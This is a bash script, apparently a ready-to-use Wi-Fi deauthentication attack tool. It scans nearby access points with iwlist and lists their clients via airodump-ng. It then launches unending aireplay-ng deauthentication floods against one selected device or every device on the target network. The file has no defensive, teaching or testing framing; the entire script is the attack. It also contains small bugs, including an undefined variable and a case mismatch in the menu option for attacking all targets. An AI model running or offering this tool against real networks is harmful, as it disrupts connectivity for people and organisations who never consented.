#!/bin/bash
normal='\e[0m'
blue='\e[1;94m'
red='\e[1;31m'
yellow='\e[1;33m'
ul='\e[1;4m'
purp='\e[1;35m'
green='\e[1;32m'

trap " echo "" ; kill `pgrep xterm 2>&1 > /dev/null` ; cd .. ; if [[ -d .workspace ]] ; then rm -rf .workspace ; fi ; exit " SIGINT SIGTERM
if [[ -d .workspace ]] ; then rm -rf .workspace ; fi
mkdir .workspace
cd .workspace
int="$1"
function scan_to_list {
	iwlist $int scan | grep -e ESSID: -e Channel: -e Address: > hosts.txt
	cat hosts.txt | grep Address: | awk {' print $5 '} > macaddress.txt
	cat hosts.txt | grep Channel | cut -d ":" -f2 > channels.txt
	cat hosts.txt | grep ESSID: | cut -d "\"" -f2 | cut -d "\"" -f1 | sed 's/^$/NO_NAME/g' > essid.txt
	list_lines=`wc -l macaddress.txt | awk {'print $1'}` ; x=1
	echo -e "$red	|__$blue Acess Points"
	echo -e "$red	|__________________________________________________________________"
	for i in `seq 1 $list_lines` ; do
		if [ $x -lt 10 ] ; then
			echo -ne "${red}		|${purp}$x ${red}|_ ${blue}Address:${yellow} $( awk NR==$i macaddress.txt ) \t"
		else
                        echo -ne "${red}                |${purp}$x${red}|_ ${blue}Address:${yellow} $( awk NR==$i macaddress.txt ) \t"
		fi
		echo -ne "${red}|__ ${blue}Channel:${yellow} $( awk NR==$i channels.txt )\t"
		echo -ne "${red}|__ ${blue}ESSID:${yellow} $( awk NR==$i essid.txt )\t"
		echo ""
		let x+=1
	done
	ll=$( expr $list_line + 1 )
	while true ; do
		echo -ne "${red}	|?|_ ${yellow}C${red}hoose ${yellow}T${red}arget number , rescan or back : " ; read target
		if [[ "$target" =~ ^[0-9]+$ ]] ; then
			macaddr=$( awk NR==$target macaddress.txt )
			channel=$( awk NR==$target channels.txt )
			essid=$( awk NR==$target essid.txt )
			break
		elif [[ $target == "rescan" ]] ; then
			scan_to_list
		elif [[ $target == "back" ]] ; then
			exit 0
		fi
	done
}
scan_to_list
function scan_to_attack {
	echo -e "${red}	|__ ${yellow}S${red}canning devices on ${yellow}$essid"
	timeout 25 xterm -e bash -c "airodump-ng -c$channel --bssid $macaddr $int 2> output.txt"
	cat output.txt | sort -u | awk {' print $2 '} | grep -v "-" | sort -u | egrep '^.{17}$' > macs.txt
	echo -e "$red	|__ $(wc -l macs.txt | awk {'print $1'}) Devices found"
	x=1
	for i in $( cat macs.txt ) ; do echo -e "$red		|${purp}$x${red}|_ ${yellow} $i " ; let x=$x+1; done
	echo -e "${red}	|__ ${yellow}A${red}ttacks"
	echo -e "${red}		|__ All \t type '${yellow}All${red}' to choose all targets"
	echo -e "${red}		|__ One \t type target number"
	echo -e "${red}		|__ ${yellow}R${red}escan"
	echo -e "${red}		|__ ${yellow}B${red}ack"
	echo -en "${red}	|?|_ Mode : " ; read option
	if [[ $option == "all" ]] ; then
		for i in $( cat macs.txt ) ; do xterm -e bash -c "aireplay-ng -0 0 -c $i -a $macaddr $int" &
		done
	elif [[ $option == "rescan" ]] ; then
		 scan_to_attack
	elif [[ $option == "back" ]] ; then
		 scan_to_list
	else
		op=$( awk NR==$option macs.txt ) ; xterm -e bash -c "aireplay-ng -0 0 -c $op -a $macaddr $int"
	fi
	wait
}
scan_to_attack
